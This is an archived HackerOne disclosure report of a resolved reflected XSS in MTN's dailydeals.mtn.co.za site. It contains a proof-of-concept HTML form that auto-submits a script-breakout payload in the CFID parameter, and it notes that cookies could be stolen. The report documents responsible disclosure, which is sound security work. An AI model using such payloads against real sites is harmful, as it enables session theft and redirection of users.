---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-reflected
  - env/web
  - vuln/xss-reflected
  - vuln/xss
  - impact/credential-theft
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Reflected"
enriched: true
body: true
date: 2022-07-15
submitted: 2022-01-17T11:44:48.945Z
bounty_usd: null
votes: 35
cve: []
program: "[[programs/mtn_group|MTN Group]]"
reporter: "shuvam321"
source: "https://hackerone.com/reports/1451394"
title: "POST BASED REFLECTED XSS IN dailydeals.mtn.co.za"
---
# POST BASED REFLECTED XSS IN dailydeals.mtn.co.za

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 35 | **Program:** MTN Group | **Disclosed:** 2022-07-15

- Report: [https://hackerone.com/reports/1451394](https://hackerone.com/reports/1451394)
- CWE: Cross-site Scripting (XSS) - Reflected
- Submitted: 2022-01-17T11:44:48.945Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
Dear Team ,
I have found a post based reflected XSS in https://dailydeals.mtn.co.za/ .

## Steps To Reproduce:

1.Create a html file with following content .

<form action="https://dailydeals.mtn.co.za/index.cfm?GO=CRAVE_ESTABLISHMENTS_LIST" method="POST"><input type="hidden" name="location_id" value="0"><input type="hidden" name="suburb" value="0"><input type="hidden" name="search_phrase" value=""><input type="hidden" name="submit_search" value="Search"><input type="hidden" name="m" value=""><input type="hidden" name="cpID" value=""><input type="hidden" name="CFID" value="a611fd5d-822a-4c08-a032-bcac1551f032'&quot;<!--><Svg OnLoad=(confirm)(1)-->"><input type="hidden" name="CFTOKEN" value="0"></form><script>document.forms[0].submit()</script>

2.Open the HTML file in any web-browser. 
  
3.Cross site Scripting will be triggered .

## Impact

Attacker can exploit this vulnerability to steal users cookies , redirect them to arbitrary domain and perform various attacks.

## Timeline

- **Report Filed**
- **2022-06-13** @incognito4: Hi @shuvam321 may you please confirm if this is still an issue.
- **2022-06-13** @shuvam321: Hi @incognito4 ,

The vulnerability  has been fixed now . You may close the report as resolved after traiging .

Kind regards ,
@shuvam321
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
